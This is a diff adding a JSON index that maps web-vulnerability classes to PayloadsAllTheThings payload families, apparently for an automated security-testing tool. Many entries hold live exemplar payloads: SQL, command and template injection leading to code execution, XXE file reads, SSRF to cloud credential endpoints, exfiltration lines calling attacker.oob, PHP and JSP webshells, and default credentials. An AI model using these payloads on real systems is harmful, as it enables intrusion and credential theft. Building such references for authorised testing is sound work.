@@ -1,0 +1,174 @@
+{
+  "$comment": "Taxonomy index over swisskyrepo/PayloadsAllTheThings — MIT licensed. Each key maps to a Checklist class id; each entry is a payload FAMILY (not a payload string). upstreamPath points at the folder / file in PayloadsAllTheThings whose contents cover that family. Rebuild with `packages/openhack/script/ingest-knowledge.ts`.",
+  "version": "2026-08-06",
+  "source": "https://github.com/swisskyrepo/PayloadsAllTheThings",
+  "license": "MIT (upstream)",
+  "byClass": {
+    "sqli": [
+      { "id": "generic", "hint": "Generic SQLi payloads (INTRUDER, syntax fuzzing)", "upstreamPath": "SQL Injection/Intruder/Generic_SQLi.txt", "weight": "medium", "exemplars": ["'", "\" OR '1'='1", "1 OR 1=1--"] },
+      { "id": "error-based", "hint": "Error-based extraction payloads", "upstreamPath": "SQL Injection/MySQL Injection.md#error-based", "weight": "high", "exemplars": ["' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database())))--", "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT version())), 1)--"] },
+      { "id": "boolean-blind", "hint": "Boolean-blind payloads", "upstreamPath": "SQL Injection/README.md#boolean-based-blind", "weight": "high", "exemplars": ["' AND 1=1--", "' AND 1=0--", "' AND SUBSTRING(@@version,1,1)='5'--"] },
+      { "id": "time-blind", "hint": "Time-based blind payloads", "upstreamPath": "SQL Injection/README.md#time-based-blind", "weight": "high", "exemplars": ["' OR SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--", "' OR pg_sleep(5)--"] },
+      { "id": "union-based", "hint": "UNION-based extraction", "upstreamPath": "SQL Injection/MySQL Injection.md#union-based", "weight": "high", "exemplars": ["' UNION SELECT NULL--", "' UNION SELECT username,password FROM users--"] },
+      { "id": "second-order", "hint": "Second-order / stored SQLi payloads", "upstreamPath": "SQL Injection/README.md#second-order", "weight": "medium" },
+      { "id": "oob-dns", "hint": "Out-of-band DNS/HTTP exfil payloads", "upstreamPath": "SQL Injection/MSSQL Injection.md#out-of-band", "weight": "high", "exemplars": ["'; SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT database()), '.attacker.oob'))--"] },
+      { "id": "polyglot", "hint": "Polyglot SQLi payloads", "upstreamPath": "SQL Injection/Intruder/Auth_Bypass.txt", "weight": "medium", "exemplars": ["SLEEP(1) /*'or SLEEP(1) or'\"or SLEEP(1) or\"*/"] }
+    ],
+    "nosqli": [
+      { "id": "operator-injection", "hint": "$ne/$gt/$where operator injection", "upstreamPath": "NoSQL Injection/README.md#mongodb-operators" },
+      { "id": "auth-bypass", "hint": "Login-form auth bypass payloads", "upstreamPath": "NoSQL Injection/Intruder/NoSQLi.txt" },
+      { "id": "js-injection", "hint": "JS-side injection ($where, mapReduce)", "upstreamPath": "NoSQL Injection/README.md#mongodb-scripting" }
+    ],
+    "cmdi": [
+      { "id": "inline-unix", "hint": "Inline unix separators (;|&&|`$()`)", "upstreamPath": "Command Injection/README.md#linux", "weight": "high", "exemplars": ["; id", "&& id", "| id", "`id`", "$(id)"] },
+      { "id": "inline-windows", "hint": "Windows inline separators (& | ^)", "upstreamPath": "Command Injection/README.md#windows", "weight": "high", "exemplars": ["& whoami", "| whoami", "^& whoami"] },
+      { "id": "blind-time", "hint": "Blind time-delay payloads", "upstreamPath": "Command Injection/README.md#blind-time-based", "weight": "high", "exemplars": ["; sleep 5", "&& sleep 5", "`sleep 5`"] },
+      { "id": "blind-oob", "hint": "Blind OOB payloads (DNS/HTTP)", "upstreamPath": "Command Injection/README.md#blind-out-of-band", "weight": "medium", "exemplars": ["; curl attacker.oob/$(id)", "; nslookup $(id).attacker.oob"] },
+      { "id": "filter-bypass", "hint": "Filter/space bypass payloads", "upstreamPath": "Command Injection/README.md#bypass-without-space", "weight": "medium", "exemplars": ["{echo,test}", "$IFS$9id", "cat<>/etc/passwd"] }
+    ],
+    "xss": [
+      { "id": "reflected", "hint": "Reflected context payloads", "upstreamPath": "XSS Injection/README.md#reflected", "weight": "high", "exemplars": ["<script>alert(1)</script>", "\"><svg onload=alert(1)>"] },
+      { "id": "stored", "hint": "Stored/DOM-persisted payloads", "upstreamPath": "XSS Injection/README.md#stored", "weight": "high", "exemplars": ["<img src=x onerror=alert(document.domain)>"] },
+      { "id": "dom-based", "hint": "DOM-based sinks (innerHTML, location.hash)", "upstreamPath": "XSS Injection/DOM based XSS.md", "weight": "high", "exemplars": ["#<script>alert(1)</script>", "javascript:alert(1)"] },
+      { "id": "polyglot", "hint": "Polyglot XSS payloads", "upstreamPath": "XSS Injection/Intruder/xss-polyglots.txt", "weight": "medium", "exemplars": ["jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"] },
+      { "id": "svg", "hint": "SVG-based payloads", "upstreamPath": "XSS Injection/README.md#svg", "weight": "medium", "exemplars": ["<svg/onload=alert(1)>", "<svg><script>alert(1)</script></svg>"] },
+      { "id": "event-handler", "hint": "Event handler variants (onerror/onload/onmouseover)", "upstreamPath": "XSS Injection/README.md#event-handlers", "weight": "medium", "exemplars": ["<img src=x onerror=alert(1)>", "<body onload=alert(1)>"] },
+      { "id": "csp-bypass", "hint": "CSP bypass payloads", "upstreamPath": "XSS Injection/XSS with CSP bypass.md", "weight": "high" },
+      { "id": "mutation-xss", "hint": "mXSS / filter-bypass mutation", "upstreamPath": "XSS Injection/README.md#filter-bypass", "weight": "medium" },
+      { "id": "template-injection-client", "hint": "Client-side template injection (Angular/Vue)", "upstreamPath": "XSS Injection/XSS in Angular.md", "weight": "high", "exemplars": ["{{constructor.constructor('alert(1)')()}}", "{{$on.constructor('alert(1)')()}}"] }
+    ],
+    "ssti": [
+      { "id": "detection-polyglot", "hint": "Detection polyglot (7*7 / ${{}} etc.)", "upstreamPath": "Server Side Template Injection/README.md#detection", "weight": "high", "exemplars": ["${7*7}", "{{7*7}}", "<%= 7*7 %>", "#{7*7}"] },
+      { "id": "jinja2", "hint": "Jinja2 / Flask RCE", "upstreamPath": "Server Side Template Injection/README.md#jinja2", "weight": "high", "exemplars": ["{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "{{ ''.__class__.__mro__[1].__subclasses__() }}"] },
+      { "id": "twig", "hint": "Twig payloads", "upstreamPath": "Server Side Template Injection/README.md#twig", "weight": "high", "exemplars": ["{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"] },
+      { "id": "freemarker", "hint": "FreeMarker/Java payloads", "upstreamPath": "Server Side Template Injection/README.md#freemarker", "weight": "high", "exemplars": ["<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"] },
+      { "id": "velocity", "hint": "Velocity payloads", "upstreamPath": "Server Side Template Injection/README.md#velocity", "weight": "high", "exemplars": ["#set($e=\"exp\")$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"id\")"] }
+    ],
+    "ssrf": [
+      { "id": "basic", "hint": "Basic SSRF to localhost/internal", "upstreamPath": "Server Side Request Forgery/README.md#basic", "weight": "high", "exemplars": ["http://127.0.0.1/", "http://localhost:80/", "http://[::1]/"] },
+      { "id": "cloud-metadata", "hint": "Cloud IMDS payloads (AWS/GCP/Azure)", "upstreamPath": "Server Side Request Forgery/README.md#cloud-metadata", "weight": "high", "exemplars": ["http://169.254.169.254/latest/meta-data/iam/security-credentials/", "http://metadata.google.internal/computeMetadata/v1/", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"] },
+      { "id": "blind-oob", "hint": "Blind SSRF via OOB", "upstreamPath": "Server Side Request Forgery/README.md#blind", "weight": "medium", "exemplars": ["http://attacker.oob/", "http://<token>.oastify.com/"] },
+      { "id": "filter-bypass", "hint": "Filter bypass (redirect / DNS rebind / URL parser)", "upstreamPath": "Server Side Request Forgery/README.md#bypass", "weight": "high", "exemplars": ["http://0.0.0.0/", "http://127.0.0.1.nip.io/", "http://spoofed.burpcollaborator.net@127.0.0.1/"] },
+      { "id": "gopher", "hint": "gopher:// / dict:// scheme abuse", "upstreamPath": "Server Side Request Forgery/README.md#gopher", "weight": "high", "exemplars": ["gopher://127.0.0.1:6379/_INFO", "dict://127.0.0.1:11211/stats"] }
+    ],
+    "xxe": [
+      { "id": "file-read", "hint": "External-entity file read", "upstreamPath": "XXE Injection/README.md#file-read", "weight": "high", "exemplars": ["<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>"] },
+      { "id": "blind-oob", "hint": "Blind XXE via OOB / parameter entities", "upstreamPath": "XXE Injection/README.md#blind", "weight": "high", "exemplars": ["<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % x SYSTEM \"http://attacker.oob/e.dtd\">%x;]>"] },
+      { "id": "xxe-ssrf", "hint": "XXE → SSRF", "upstreamPath": "XXE Injection/README.md#xxe-to-ssrf", "weight": "high", "exemplars": ["<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><r>&x;</r>"] },
+      { "id": "xinclude", "hint": "XInclude / SOAP variants", "upstreamPath": "XXE Injection/README.md#xinclude", "weight": "medium" }
+    ],
+    "traversal-lfi": [
+      { "id": "traversal", "hint": "../ traversal + encodings", "upstreamPath": "Directory Traversal/README.md", "weight": "high", "exemplars": ["../../../../etc/passwd", "..%2f..%2f..%2fetc/passwd", "....//....//....//etc/passwd"] },
+      { "id": "lfi-basic", "hint": "Basic LFI (log/env poisoning)", "upstreamPath": "File Inclusion/README.md#lfi", "weight": "high", "exemplars": ["/var/log/apache2/access.log", "/proc/self/environ"] },
+      { "id": "lfi-wrappers", "hint": "PHP wrappers (php://filter, data://, expect://)", "upstreamPath": "File Inclusion/README.md#php-wrappers", "weight": "high", "exemplars": ["php://filter/convert.base64-encode/resource=index.php", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==", "expect://id"] },
+      { "id": "rfi", "hint": "RFI", "upstreamPath": "File Inclusion/README.md#rfi", "weight": "high", "exemplars": ["http://attacker.tld/shell.txt"] }
+    ],
+    "upload": [
+      { "id": "extension-bypass", "hint": "Extension / content-type / magic bypass", "upstreamPath": "Upload Insecure Files/README.md", "weight": "high", "exemplars": ["shell.php.jpg", "shell.pHp", "shell.php%00.jpg"] },
+      { "id": "webshell", "hint": "Webshell payloads by language", "upstreamPath": "Upload Insecure Files/Extension PHP/", "weight": "high", "exemplars": ["<?php system($_GET['c']); ?>", "<%= Runtime.getRuntime().exec(request.getParameter(\"c\")) %>"] },
+      { "id": "svg-xss", "hint": "SVG-XSS via upload", "upstreamPath": "Upload Insecure Files/Extension SVG/", "weight": "medium", "exemplars": ["<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"/>"] },
+      { "id": "filename-traversal", "hint": "Filename path traversal on upload", "upstreamPath": "Upload Insecure Files/README.md#filename-traversal", "weight": "high", "exemplars": ["../../../../etc/cron.d/pwned", "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"] }
+    ],
+    "injection-misc": [
+      { "id": "ldap", "hint": "LDAP injection payloads", "upstreamPath": "LDAP Injection/README.md" },
+      { "id": "xpath", "hint": "XPath injection payloads", "upstreamPath": "XPATH Injection/README.md" },
+      { "id": "crlf", "hint": "CRLF / header injection", "upstreamPath": "CRLF Injection/README.md" },
+      { "id": "host-header", "hint": "Host-header injection", "upstreamPath": "Server Side Request Forgery/README.md#host-header" },
+      { "id": "email-smtp", "hint": "SMTP / email header injection", "upstreamPath": "SMTP Injection/README.md" }
+    ],
+    "csrf": [
+      { "id": "no-token", "hint": "Missing/unvalidated CSRF token", "upstreamPath": "CSRF Injection/README.md" },
+      { "id": "samesite-bypass", "hint": "SameSite=Lax bypass techniques", "upstreamPath": "CSRF Injection/README.md#samesite" },
+      { "id": "method-override", "hint": "Method/content-type override", "upstreamPath": "CSRF Injection/README.md#method-override" },
+      { "id": "json-csrf", "hint": "JSON-form CSRF payload", "upstreamPath": "CSRF Injection/README.md#json" }
+    ],
+    "cors": [
+      { "id": "reflect-origin", "hint": "Reflected Origin + credentials", "upstreamPath": "CORS Misconfiguration/README.md" },
+      { "id": "null-origin", "hint": "null-origin trust abuse", "upstreamPath": "CORS Misconfiguration/README.md#null-origin" },
+      { "id": "wildcard-creds", "hint": "Wildcard + credentials misconfig", "upstreamPath": "CORS Misconfiguration/README.md#wildcard-credentials" }
+    ],
+    "open-redirect": [
+      { "id": "param-redirect", "hint": "Redirect parameter abuse", "upstreamPath": "Open Redirect/README.md" },
+      { "id": "filter-bypass", "hint": "Filter bypass (@, //, encoded)", "upstreamPath": "Open Redirect/README.md#bypass" }
+    ],
+    "prototype-pollution": [
+      { "id": "client-side", "hint": "Client-side pollution via query/body", "upstreamPath": "Prototype Pollution/README.md#client-side" },
+      { "id": "server-side", "hint": "Server-side pollution → RCE gadget", "upstreamPath": "Prototype Pollution/README.md#server-side" }
+    ],
+    "deserialization": [
+      { "id": "php-object", "hint": "PHP object injection / magic methods", "upstreamPath": "Insecure Deserialization/PHP.md", "weight": "high" },
+      { "id": "java-ysoserial", "hint": "Java / ysoserial gadgets", "upstreamPath": "Insecure Deserialization/Java.md", "weight": "high" },
+      { "id": "python-pickle", "hint": "Python pickle payloads", "upstreamPath": "Insecure Deserialization/Python.md", "weight": "high" },
+      { "id": "dotnet", "hint": ".NET BinaryFormatter / JSON.NET gadgets", "upstreamPath": "Insecure Deserialization/DotNET.md", "weight": "high" },
+      { "id": "ruby-marshal", "hint": "Ruby Marshal", "upstreamPath": "Insecure Deserialization/Ruby.md", "weight": "medium" },
+      { "id": "nodejs", "hint": "Node.js (node-serialize) gadgets", "upstreamPath": "Insecure Deserialization/NodeJS.md", "weight": "high" }
+    ],
+    "request-smuggling": [
+      { "id": "clte", "hint": "CL.TE payloads", "upstreamPath": "Request Smuggling/README.md#clte" },
+      { "id": "tecl", "hint": "TE.CL payloads", "upstreamPath": "Request Smuggling/README.md#tecl" },
+      { "id": "tete", "hint": "TE.TE header obfuscation", "upstreamPath": "Request Smuggling/README.md#tete" },
+      { "id": "h2-downgrade", "hint": "HTTP/2 → HTTP/1.1 downgrade smuggling", "upstreamPath": "Request Smuggling/README.md#http2" }
+    ],
+    "cache": [
+      { "id": "unkeyed-poisoning", "hint": "Unkeyed-input cache poisoning", "upstreamPath": "Web Cache Deception/README.md#poisoning" },
+      { "id": "path-deception", "hint": "Path-confusion cache deception", "upstreamPath": "Web Cache Deception/README.md#deception" }
+    ],
+    "race": [
+      { "id": "single-packet", "hint": "Single-packet limit overrun", "upstreamPath": "Race Condition/README.md" },
+      { "id": "toctou-multi", "hint": "TOCTOU / multi-endpoint race", "upstreamPath": "Race Condition/README.md#multi-endpoint" }
+    ],
+    "business-logic": [
+      { "id": "price-tampering", "hint": "Price / quantity / overflow tampering", "upstreamPath": "Business Logic Errors/README.md" },
+      { "id": "workflow-skip", "hint": "Workflow / step-skip abuse", "upstreamPath": "Business Logic Errors/README.md#workflow" },
+      { "id": "coupon-stacking", "hint": "Coupon / discount abuse", "upstreamPath": "Business Logic Errors/README.md#coupon" }
+    ],
+    "graphql": [
+      { "id": "introspection", "hint": "Introspection queries", "upstreamPath": "GraphQL Injection/README.md#introspection" },
+      { "id": "batching-alias", "hint": "Batching / aliasing brute", "upstreamPath": "GraphQL Injection/README.md#batching" },
+      { "id": "field-suggestion", "hint": "Field-suggestion enumeration", "upstreamPath": "GraphQL Injection/README.md#field-suggestion" },
+      { "id": "graphql-idor", "hint": "GraphQL IDOR / BOLA", "upstreamPath": "GraphQL Injection/README.md#idor" }
+    ],
+    "websocket": [
+      { "id": "cswsh", "hint": "Cross-site WebSocket hijacking", "upstreamPath": "Web Sockets/README.md#cswsh" },
+      { "id": "message-tampering", "hint": "Message injection / tampering", "upstreamPath": "Web Sockets/README.md#tampering" }
+    ],
+    "auth": [
+      { "id": "default-creds", "hint": "Default / weak credential list", "upstreamPath": "Account Takeover/README.md#weak", "weight": "high", "exemplars": ["admin:admin", "root:root", "admin:password", "test:test"] },
+      { "id": "jwt-alg-none", "hint": "JWT alg=none / weak-secret / kid injection", "upstreamPath": "JSON Web Token/README.md", "weight": "high", "exemplars": ["eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.", "{\"alg\":\"none\"}"] },
+      { "id": "oauth-redirect", "hint": "OAuth redirect_uri / state / implicit", "upstreamPath": "OAuth Misconfiguration/README.md", "weight": "high", "exemplars": ["?redirect_uri=https://attacker.tld/", "?redirect_uri=https://target.tld.attacker.tld/", "?redirect_uri=//attacker.tld/"] },
+      { "id": "reset-poisoning", "hint": "Password-reset host-header poisoning", "upstreamPath": "Account Takeover/README.md#password-reset", "weight": "high", "exemplars": ["Host: attacker.tld", "X-Forwarded-Host: attacker.tld"] },
+      { "id": "2fa-bypass", "hint": "2FA-skip / response-tampering", "upstreamPath": "Account Takeover/README.md#2fa", "weight": "high" }
+    ],
+    "session": [
+      { "id": "cookie-flags", "hint": "Missing HttpOnly/Secure/SameSite check", "upstreamPath": "Methodology and Resources/Cookies.md" },
+      { "id": "fixation", "hint": "Session fixation", "upstreamPath": "Methodology and Resources/Cookies.md#fixation" }
+    ],
+    "access-control": [
+      { "id": "idor", "hint": "IDOR / horizontal privesc", "upstreamPath": "Insecure Direct Object References/README.md" },
+      { "id": "forced-browsing", "hint": "Forced-browsing wordlist", "upstreamPath": "Insecure Management Interface/README.md" },
+      { "id": "verb-tampering", "hint": "Method-verb tampering", "upstreamPath": "Insecure Direct Object References/README.md#verb-tampering" }
+    ],
+    "api-bola-bfla": [
+      { "id": "bola-object-id", "hint": "Object-id tampering across tenants", "upstreamPath": "API/README.md#bola" },
+      { "id": "bfla-privileged", "hint": "Privileged function via role tampering", "upstreamPath": "API/README.md#bfla" },
+      { "id": "mass-assignment", "hint": "Mass-assignment / excessive property binding", "upstreamPath": "API/README.md#mass-assignment" }
+    ],
+    "info-disclosure": [
+      { "id": "metafiles", "hint": "robots.txt / sitemap / .well-known", "upstreamPath": "Methodology and Resources/Metadata.md" },
+      { "id": "backup-source", "hint": "Backup / source / .git / .env", "upstreamPath": "Methodology and Resources/Metadata.md#source" },
+      { "id": "api-docs-leak", "hint": "Swagger / OpenAPI / GraphQL introspection leak", "upstreamPath": "API/README.md#docs" }
+    ],
+    "user-enum": [
+      { "id": "login-oracle", "hint": "Login-response oracle wordlists", "upstreamPath": "Account Takeover/README.md#user-enumeration" }
+    ],
+    "clickjacking": [
+      { "id": "no-frame-defense", "hint": "No X-Frame-Options / frame-ancestors PoC", "upstreamPath": "Clickjacking/README.md" }
+    ],
+    "rate-limit": [
+      { "id": "no-limit-sensitive", "hint": "No rate-limit on sensitive endpoint tests", "upstreamPath": "API/README.md#rate-limit" }
+    ],
+    "vhost-origin": [
+      { "id": "origin-ip", "hint": "Direct-to-origin discovery", "upstreamPath": "Methodology and Resources/Bug Bounty Reference.md" }
+    ]
+  }
+}
